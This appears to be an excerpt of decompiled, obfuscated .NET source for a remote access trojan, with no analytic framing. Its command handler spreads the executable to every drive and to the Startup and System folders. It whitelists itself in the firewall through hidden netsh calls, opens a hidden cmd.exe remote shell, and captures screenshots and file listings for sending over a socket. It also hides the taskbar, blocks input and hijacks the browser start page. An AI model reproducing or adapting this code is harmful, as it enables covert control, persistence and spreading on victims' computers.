  public static string \u0040Օ()
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      long num4 = (long) \u0040Ӛ.\u0040ӟ("Shell_TrayWnd", (string) null);
label_3:
      num3 = 3;
      int num5 = checked ((int) num4);
      string str1 = "ReBarWindow32";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      long num6 = (long) \u0040Ә.\u0040Ց(num5, 0, ref local1, ref local2);
label_4:
      num3 = 4;
      \u0040Ӛ.\u0040Ӣ((IntPtr) num6, 0);
      goto label_11;
label_6:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num7 = num2 + 1;
          num2 = 0;
          switch (num7)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_11;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_6;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_11:
    string str3;
    string str4 = str3;
    if (num2 == 0)
      return str4;
    ProjectData.ClearProjectError();
    return str4;
  }

  public static string \u0040Ֆ()
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      long num4 = (long) \u0040Ӛ.\u0040ӟ("Shell_TrayWnd", (string) null);
label_3:
      num3 = 3;
      int num5 = checked ((int) num4);
      string str1 = "TrayNotifyWnd";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      long num6 = (long) \u0040Ә.\u0040Ց(num5, 0, ref local1, ref local2);
label_4:
      num3 = 4;
      int num7 = checked ((int) num6);
      string str3 = "TrayClockWClass";
      ref string local3 = ref str3;
      string str4 = (string) null;
      ref string local4 = ref str4;
      long num8 = (long) \u0040Ә.\u0040Ց(num7, 0, ref local3, ref local4);
label_5:
      num3 = 5;
      \u0040Ӛ.\u0040Ӣ((IntPtr) num8, 0);
      goto label_12;
label_7:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num9 = num2 + 1;
          num2 = 0;
          switch (num9)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_12;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_7;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_12:
    string str5;
    string str6 = str5;
    if (num2 == 0)
      return str6;
    ProjectData.ClearProjectError();
    return str6;
  }

  public static string \u0040\u0557()
  {
label_1:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      long num4 = (long) \u0040Ӛ.\u0040ӟ("Shell_TrayWnd", (string) null);
label_3:
      num3 = 3;
      int num5 = checked ((int) num4);
      string str1 = "TrayNotifyWnd";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      long num6 = (long) \u0040Ә.\u0040Ց(num5, 0, ref local1, ref local2);
label_4:
      num3 = 4;
      int num7 = checked ((int) num6);
      string str3 = "TrayClockWClass";
      ref string local3 = ref str3;
      string str4 = (string) null;
      ref string local4 = ref str4;
      long num8 = (long) \u0040Ә.\u0040Ց(num7, 0, ref local3, ref local4);
label_5:
      num3 = 5;
      \u0040Ӛ.\u0040Ӣ((IntPtr) num8, 1);
      goto label_12;
label_7:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num9 = num2 + 1;
          num2 = 0;
          switch (num9)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_12;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_7;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_12:
    string str5;
    string str6 = str5;
    if (num2 == 0)
      return str6;
    ProjectData.ClearProjectError();
    return str6;
  }

  public static object \u0040\u0558(string _param0)
  {
    Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main", true).SetValue("Start Page", (object) _param0);
    object obj;
    return obj;
  }

  [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int \u0040ՙ([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1);

  [DllImport("user32", EntryPoint = "_SetWindowPos", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int \u0040\u055A(
    int _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4,
    int _param5,
    int _param6);

  [DllImport("user32.dll", EntryPoint = "_SendMessage", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern void \u0040\u055B(int _param0, uint _param1, uint _param2, int _param3);

  [DllImport("user32", EntryPoint = "SystemParametersInfoA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040\u055C(
    int _param0,
    int _param1,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param2,
    int _param3);

  [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int \u0040\u055D([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1);

  [DllImport("user32", EntryPoint = "SetWindowPos_", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int \u0040\u055E(
    int _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4,
    int _param5,
    int _param6);

  [DllImport("user32.dll", EntryPoint = "SendMessage_", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern void \u0040\u055F(int _param0, uint _param1, uint _param2, int _param3);

  private static void \u0040\u0560(object _param0, SessionEndingEventArgs _param1) => \u0040Ә.\u0040Ն();

  public static object \u0040ա() => (object) ((double) MyProject.Computer.Info.TotalPhysicalMemory / 1024.0 / 1024.0 / 1024.0).ToString("##.#GB");

  public static object \u0040բ()
  {
    string englishName = CultureInfo.CurrentCulture.EnglishName;
    englishName.Substring(checked (englishName.IndexOf('(') + 1), checked (englishName.LastIndexOf(')') - englishName.IndexOf('(') - 1));
    object obj;
    return obj;
  }

  public static object \u0040գ()
  {
    object obj;
    try
    {
      obj = (object) \u0040Ә.\u0040Բ.LastWriteTime.ToString("dd-MM-yyyy");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      obj = (object) "00-00-0000";
      ProjectData.ClearProjectError();
    }
    return obj;
  }

  public static void \u0040դ(byte[] _param0)
  {
    if (!\u0040Ә.\u0040Ӡ)
      return;
    try
    {
      object Instance1 = (object) new MemoryStream();
      object Instance2 = Instance1;
      object[] objArray = new object[3]
      {
        (object) _param0,
        (object) 0,
        (object) _param0.Length
      };
      object[] Arguments = objArray;
      bool[] flagArray = new bool[3]{ true, false, false };
      bool[] CopyBack = flagArray;
      NewLateBinding.LateCall(Instance2, (System.Type) null, "Write", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
      if (flagArray[0])
        _param0 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (byte[]));
      NewLateBinding.LateCall(Instance1, (System.Type) null, "Write", new object[3]
      {
        (object) \u0040Ә.\u0040\u0588(ref \u0040Ә.\u0040Ӛ),
        (object) 0,
        (object) \u0040Ә.\u0040Ӛ.Length
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      \u0040Ә.\u0040ӟ.Client.Send((byte[]) NewLateBinding.LateGet(Instance1, (System.Type) null, "ToArray", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), 0, Conversions.ToInteger(NewLateBinding.LateGet(Instance1, (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), SocketFlags.None);
      NewLateBinding.LateCall(Instance1, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      \u0040Ә.\u0040Ӡ = false;
      ProjectData.ClearProjectError();
    }
  }

  public static object \u0040ե(object _param0)
  {
    int num1;
    object obj1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 2;
      if (Operators.ConditionalCompareObjectGreaterEqual(_param0, (object) 1073741824, false))
      {
        obj1 = (object) (Strings.Format(Operators.DivideObject(Operators.DivideObject(Operators.DivideObject(_param0, (object) 1024), (object) 1024), (object) 1024), "#0.00") + " GB");
        goto label_15;
      }
      else if (Operators.ConditionalCompareObjectGreaterEqual(_param0, (object) 1048576, false))
      {
        obj1 = (object) (Strings.Format(Operators.DivideObject(Operators.DivideObject(_param0, (object) 1024), (object) 1024), "#0.00") + " MB");
        goto label_15;
      }
      else if (Operators.ConditionalCompareObjectGreaterEqual(_param0, (object) 1024, false))
      {
        obj1 = (object) (Strings.Format(Operators.DivideObject(_param0, (object) 1024), "#0.00") + " KB");
        goto label_15;
      }
      else if (Operators.ConditionalCompareObjectLess(_param0, (object) 1024, false))
      {
        obj1 = Operators.ConcatenateObject(Conversion.Fix(RuntimeHelpers.GetObjectValue(_param0)), (object) " KB");
        goto label_15;
      }
      else
        goto label_15;
label_10:
      num2 = -1;
      switch (num1)
      {
        case 2:
          obj1 = (object) "0,00 KB";
          goto label_15;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_10;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_15:
    object obj2 = obj1;
    if (num2 == 0)
      return obj2;
    ProjectData.ClearProjectError();
    return obj2;
  }

  public static Image \u0040զ()
  {
    Image image;
    try
    {
      Rectangle rectangle = new Rectangle();
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
      image = (Image) bitmap;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      image = (Image) null;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return image;
  }

  public static RegistryKey \u0040է(string _param0)
  {
    if (_param0.StartsWith(\u0040Ә.\u0040ӣ.Registry.ClassesRoot.Name))
    {
      string name = _param0.Replace(\u0040Ә.\u0040ӣ.Registry.ClassesRoot.Name + "\\", "");
      return \u0040Ә.\u0040ӣ.Registry.ClassesRoot.OpenSubKey(name, true);
    }
    if (_param0.StartsWith(\u0040Ә.\u0040ӣ.Registry.CurrentUser.Name))
    {
      string name = _param0.Replace(\u0040Ә.\u0040ӣ.Registry.CurrentUser.Name + "\\", "");
      return \u0040Ә.\u0040ӣ.Registry.CurrentUser.OpenSubKey(name, true);
    }
    if (_param0.StartsWith(\u0040Ә.\u0040ӣ.Registry.LocalMachine.Name))
    {
      string name = _param0.Replace(\u0040Ә.\u0040ӣ.Registry.LocalMachine.Name + "\\", "");
      return \u0040Ә.\u0040ӣ.Registry.LocalMachine.OpenSubKey(name, true);
    }
    if (!_param0.StartsWith(\u0040Ә.\u0040ӣ.Registry.Users.Name))
      return (RegistryKey) null;
    string name1 = _param0.Replace(\u0040Ә.\u0040ӣ.Registry.Users.Name + "\\", "");
    return \u0040Ә.\u0040ӣ.Registry.Users.OpenSubKey(name1, true);
  }

  [DllImport("user32.dll", EntryPoint = "SendMessage", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern void \u0040ը(int _param0, uint _param1, uint _param2, int _param3);

  [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern long \u0040թ(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
    long _param2,
    long _param3);

  [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040ժ(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
    int _param2,
    int _param3);

  [DllImport("user32", EntryPoint = "SetWindowPos", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040ի(
    int _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4,
    int _param5,
    int _param6);

  [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern long \u0040լ(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
    long _param2,
    long _param3);

  [DllImport("user32", EntryPoint = "SwapMouseButton", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern long \u0040խ(long _param0);

  [DllImport("user32", EntryPoint = "SystemParametersInfoA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040ծ(int _param0, int _param1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param2, int _param3);

  public static object \u0040կ(object _param0)
  {
    object obj;
    try
    {
      DirectoryInfo directoryInfo1 = new DirectoryInfo(Conversions.ToString(_param0));
      string str = "";
      DirectoryInfo[] directories = directoryInfo1.GetDirectories();
      int index = 0;
      while (index < directories.Length)
      {
        DirectoryInfo directoryInfo2 = directories[index];
        str = str + "%DIRET%%|%" + directoryInfo2.Name + "%|%\r\n";
        checked { ++index; }
      }
      obj = (object) str;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return obj;
  }

  public static Array \u0040հ(byte[] _param0, string _param1)
  {
    object Instance1 = (object) new List<byte[]>();
    object Instance2 = (object) new MemoryStream();
    object Instance3 = (object) new MemoryStream();
    string[] strArray = Strings.Split(\u0040Ә.\u0040Կ(ref _param0), _param1);
    object Instance4 = Instance2;
    object[] objArray1 = new object[3]
    {
      (object) _param0,
      (object) 0,
      (object) strArray[0].Length
    };
    object[] Arguments1 = objArray1;
    bool[] flagArray1 = new bool[3]{ true, false, false };
    bool[] CopyBack1 = flagArray1;
    NewLateBinding.LateCall(Instance4, (System.Type) null, "Write", Arguments1, (string[]) null, (System.Type[]) null, CopyBack1, true);
    if (flagArray1[0])
      _param0 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (byte[]));
    object Instance5 = Instance3;
    object[] objArray2 = new object[3]
    {
      (object) _param0,
      (object) checked (strArray[0].Length + _param1.Length),
      (object) checked (_param0.Length - strArray[0].Length + _param1.Length)
    };
    object[] Arguments2 = objArray2;
    bool[] flagArray2 = new bool[3]{ true, false, false };
    bool[] CopyBack2 = flagArray2;
    NewLateBinding.LateCall(Instance5, (System.Type) null, "Write", Arguments2, (string[]) null, (System.Type[]) null, CopyBack2, true);
    if (flagArray2[0])
      _param0 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof (byte[]));
    object Instance6 = Instance1;
    object[] objArray3 = new object[1];
    object[] objArray4 = objArray3;
    object Instance7 = Instance2;
    object objectValue1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance7, (System.Type) null, "ToArray", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
    objArray4[0] = objectValue1;
    object[] objArray5 = objArray3;
    object[] Arguments3 = objArray5;
    bool[] flagArray3 = new bool[1]{ true };
    bool[] CopyBack3 = flagArray3;
    NewLateBinding.LateCall(Instance6, (System.Type) null, "Add", Arguments3, (string[]) null, (System.Type[]) null, CopyBack3, true);
    if (flagArray3[0])
      NewLateBinding.LateSetComplex(Instance7, (System.Type) null, "ToArray", new object[1]
      {
        RuntimeHelpers.GetObjectValue(objArray5[0])
      }, (string[]) null, (System.Type[]) null, true, false);
    object Instance8 = Instance1;
    object[] objArray6 = new object[1];
    object[] objArray7 = objArray6;
    object Instance9 = Instance3;
    object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance9, (System.Type) null, "ToArray", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
    objArray7[0] = objectValue2;
    object[] objArray8 = objArray6;
    object[] Arguments4 = objArray8;
    bool[] flagArray4 = new bool[1]{ true };
    bool[] CopyBack4 = flagArray4;
    NewLateBinding.LateCall(Instance8, (System.Type) null, "Add", Arguments4, (string[]) null, (System.Type[]) null, CopyBack4, true);
    if (flagArray4[0])
      NewLateBinding.LateSetComplex(Instance9, (System.Type) null, "ToArray", new object[1]
      {
        RuntimeHelpers.GetObjectValue(objArray8[0])
      }, (string[]) null, (System.Type[]) null, true, false);
    NewLateBinding.LateCall(Instance2, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    NewLateBinding.LateCall(Instance3, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    return (Array) NewLateBinding.LateGet(Instance1, (System.Type) null, "ToArray", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
  }

  public static object \u0040ձ()
  {
    object obj;
    try
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      string str;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          str = str + "%DIISC%%|%" + driveInfo.Name + "%|%" + driveInfo.TotalSize.ToString() + "%|%\r\n";
        checked { ++index; }
      }
      obj = (object) str;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return obj;
  }

  public static object \u0040ղ(object _param0)
  {
    object obj;
    try
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(_param0));
      string str = "";
      FileInfo[] files = directoryInfo.GetFiles("*.*");
      int index = 0;
      while (index < files.Length)
      {
        FileInfo fileInfo = files[index];
        str = str + "%FILESS%%|%" + fileInfo.Name + "%|%" + fileInfo.Length.ToString() + "%|%\r\n";
        checked { ++index; }
      }
      obj = (object) str;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return obj;
  }

  public static object \u0040ճ()
  {
    object obj;
    return obj;
  }

  public static string \u0040մ(string _param0)
  {
    string str;
    try
    {
      object Instance = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(\u0040Ә.\u0040ճ(), (System.Type) null, "Registry", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "CurrentUser", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "CreateSubKey", new object[1]
      {
        (object) "Software\\ShortCutInfection"
      }, (string[]) null, (System.Type[]) null, (bool[]) null);
      object[] objArray = new object[2]
      {
        (object) _param0,
        (object) ""
      };
      object[] Arguments = objArray;
      bool[] flagArray = new bool[2]{ true, false };
      bool[] CopyBack = flagArray;
      object obj = NewLateBinding.LateGet(Instance, (System.Type) null, "GetValue", Arguments, (string[]) null, (System.Type[]) null, CopyBack);
      if (flagArray[0])
        _param0 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
      str = Conversions.ToString(obj);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = "error < Not Found >";
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static object \u0040յ(string _param0, string _param1)
  {
    try
    {
      object Instance = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(\u0040Ә.\u0040ճ(), (System.Type) null, "Registry", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "CurrentUser", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "CreateSubKey", new object[1]
      {
        (object) "Software\\ShortCutInfection"
      }, (string[]) null, (System.Type[]) null, (bool[]) null);
      object[] objArray = new object[2]
      {
        (object) _param0,
        (object) _param1
      };
      object[] Arguments = objArray;
      bool[] flagArray = new bool[2]{ true, true };
      bool[] CopyBack = flagArray;
      NewLateBinding.LateCall(Instance, (System.Type) null, "SetValue", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
      if (flagArray[0])
        _param0 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
      if (flagArray[1])
        _param1 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return (object) null;
  }

  public static string \u0040ն() => Environment.MachineName + "\\" + Environment.UserName + \u0040Ә.\u0040Ի;

  public static IntPtr \u0040շ(IntPtr _param0)
  {
    IntPtr num;
    return num;
  }

  public static IntPtr \u0040ո(IntPtr _param0)
  {
    IntPtr num;
    return num;
  }

  [DllImport("KERNEL32.DLL", EntryPoint = "Beep")]
  public static extern void \u0040չ(int _param0, int _param1);

  [DllImport("user32", EntryPoint = "BlockInput_", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern long \u0040պ(long _param0);

  [DllImport("user32", EntryPoint = "BlockInput", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int \u0040ջ(int _param0);

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void \u0040ռ(byte[] _param0_1)
  {
    string[] strArray1 = Strings.Split(\u0040Ә.\u0040Կ(ref _param0_1), \u0040Ә.\u0040Ի);
    try
    {
      string Left1 = strArray1[0];
      string Left2 = Left1;
      byte[] buffer;
      if (Operators.CompareString(Left2, "time", false) == 0)
        DateAndTime.TimeOfDay = Conversions.ToDate(strArray1[1]);
      else if (Operators.CompareString(Left2, "piano", false) == 0)
        \u0040Ә.\u0040չ(Conversions.ToInteger(strArray1[1]), 300);
      else if (Operators.CompareString(Left2, "BepX", false) == 0)
        \u0040Ә.\u0040չ(checked ((int) Math.Round(Math.Round(Math.Round(Conversion.Val(strArray1[1]))))), checked ((int) Math.Round(Math.Round(Math.Round(Conversion.Val(strArray1[2]))))));
      else if (Operators.CompareString(Left2, "piano", false) == 0)
        \u0040Ә.\u0040չ(checked ((int) Math.Round(Math.Round(Math.Round(Conversion.Val(strArray1[1]))))), 300);
      else if (Operators.CompareString(Left2, "BepX", false) == 0)
        \u0040Ә.\u0040չ(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
      else if (Operators.CompareString(Left2, "piano", false) == 0)
        \u0040Ә.\u0040չ(Conversions.ToInteger(strArray1[1]), 300);
      else if (Operators.CompareString(Left2, "TextToSpeech", false) == 0)
      {
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice"));
        object[] objArray1 = new object[1];
        object[] objArray2 = objArray1;
        string[] strArray2 = strArray1;
        string[] strArray3 = strArray2;
        int index1 = 1;
        int index2 = index1;
        string str = strArray3[index2];
        objArray2[0] = (object) str;
        object[] objArray3 = objArray1;
        object[] Arguments = objArray3;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        NewLateBinding.LateCall(objectValue, (System.Type) null, "speak", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
        if (flagArray[0])
          strArray2[index1] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof (string));
      }
      else if (Operators.CompareString(Left2, "virs", false) == 0)
        \u0040Ә.\u0040\u0589("virs");
      else if (Operators.CompareString(Left2, "virs", false) == 0)
      {
        while (true)
        {
          int num1 = (int) Interaction.MsgBox((object) "Doni!", MsgBoxStyle.Critical, (object) "!~ Hacker ~!");
        }
      }
      else if (Operators.CompareString(Left2, "hard", false) == 0)
      {
        string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          try
          {
            System.IO.File.Copy(Application.ExecutablePath, str + \u0040Ә.\u0040Ӳ + ".exe");
            System.IO.File.SetAttributes(str + \u0040Ә.\u0040Ӳ + ".exe", FileAttributes.Normal);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
      }
      else if (Operators.CompareString(Left2, "System", false) == 0)
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + \u0040Ә.\u0040Ӭ + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
        System.IO.File.Delete(path);
      }
      else if (Operators.CompareString(Left2, "USB", false) == 0)
        \u0040ӛ.\u0040ӓ();
      else if (Operators.CompareString(Left2, "UAC", false) == 0)
      {
        Interaction.Shell("netsh firewall delete allowedprogram \"" + \u0040Ә.\u0040Բ.FullName + "\"", AppWinStyle.Hide);
        Interaction.Shell("netsh firewall add allowedprogram \"" + \u0040Ә.\u0040Բ.FullName + "\" \"" + \u0040Ә.\u0040Բ.Name + "\" ENABLE", AppWinStyle.Hide);
      }
      else if (Operators.CompareString(Left2, "sperd", false) == 0)
      {
        \u0040Ә.\u0040\u0589("sperd");
        string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Ӭ + ".exe";
        System.IO.File.Copy(\u0040Ә.\u0040Բ.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + strArray1[1] + ".exe", true);
        \u0040Ә.\u0040Ӥ = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Է + strArray1[1] + ".exe", FileMode.Open);
        if (!System.IO.File.Exists(path))
          ;
      }
      else if (Operators.CompareString(Left2, "form10", false) == 0)
        \u0040Ә.\u0040\u0589("form10");
      else if (Operators.CompareString(Left2, "DeMon2", false) == 0)
        MyProject.Computer.Clipboard.SetText(strArray1[1]);
      else if (Operators.CompareString(Left2, "DeMon", false) == 0)
        \u0040Ә.\u0040\u0589("DeMon" + \u0040Ә.\u0040Ի + System.IO.File.ReadAllText(Path.GetTempPath() + "\\FransescoPast.txt"));
      else if (Operators.CompareString(Left2, "rss", false) == 0)
      {
        try
        {
          NewLateBinding.LateCall(\u0040Ә.\u0040ӓ, (System.Type) null, "Kill", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        \u0040Ә.\u0040ӓ = (object) new Process();
        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(\u0040Ә.\u0040ӓ, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "RedirectStandardOutput", new object[1]
        {
          (object) true
        }, (string[]) null, (System.Type[]) null, false, true);
        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(\u0040Ә.\u0040ӓ, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "RedirectStandardInput", new object[1]
        {
          (object) true
        }, (string[]) null, (System.Type[]) null, false, true);
        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(\u0040Ә.\u0040ӓ, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "RedirectStandardError", new object[1]
        {
          (object) true
        }, (string[]) null, (System.Type[]) null, false, true);
        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(\u0040Ә.\u0040ӓ, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "FileName", new object[1]
        {
          (object) "cmd.exe"
        }, (string[]) null, (System.Type[]) null, false, true);
        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(\u0040Ә.\u0040ӓ, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "RedirectStandardError", new object[1]
        {
          (object) true
        }, (string[]) null, (System.Type[]) null, false, true);
        ((Process) \u0040Ә.\u0040ӓ).OutputDataReceived += new DataReceivedEventHandler(\u0040Ә.\u0040Ւ);
        ((Process) \u0040Ә.\u0040ӓ).ErrorDataReceived += new DataReceivedEventHandler(\u0040Ә.\u0040Ւ);
        ((Process) \u0040Ә.\u0040ӓ).Exited += (EventHandler) ((_param0_2, _param1) => \u0040Ә.\u0040Փ());
        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(\u0040Ә.\u0040ӓ, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "UseShellExecute", new object[1]
        {
          (object) false
        }, (string[]) null, (System.Type[]) null, false, true);
        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(\u0040Ә.\u0040ӓ, (System.Type) null, "StartInfo", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "CreateNoWindow", new object[1]
        {
          (object) true
        }, (string[]) null, (System.Type[]) null, false, true);
